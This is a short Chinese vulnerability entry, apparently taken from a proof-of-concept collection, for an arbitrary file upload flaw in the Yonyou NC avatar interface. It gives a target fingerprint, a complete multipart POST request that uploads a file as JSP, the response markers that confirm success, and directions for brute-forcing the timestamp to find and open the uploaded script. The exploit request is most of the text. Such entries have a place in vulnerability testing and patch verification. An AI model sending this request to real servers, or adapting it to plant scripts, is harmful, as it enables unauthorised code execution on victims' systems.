﻿# 用友 NC avatar 任意文件上传漏洞

> 更新时间：2024-03-02

> 漏洞编号：

> 漏洞说明：用友 NC acatar接口存在任意文件上传漏洞，可上传恶意脚本至服务器。

> 漏洞特征：body="/Client/Uclient/UClient.exe"

> 验证脚本：HTTP

```
POST /uapim/upload/avatar?usercode=qbll&fileType=jsp HTTP/1.1
Connection: close
Accept-Encoding: gzip, deflate, br
Content-Type: multipart/form-data; boundary=----v6bavojmqudas7g0al2o

------v6bavojmqudas7g0al2o
Content-Disposition: form-data; name="uploadedfile"; filename="dudesuite.txt"

dudesuite
------v6bavojmqudas7g0al2o--
```

> 响应代码特征：200

> 响应内容特征：true

> 上传文件定位：

> 验证文件来源：用友NC avatar 任意文件上传漏洞.poc

```
在上传文件后，需要爆破落地文件名称时间戳，得到最终访问路径。
GET /uapim/static/pages/photo/qbll/qbll.1703855300049.jsp
```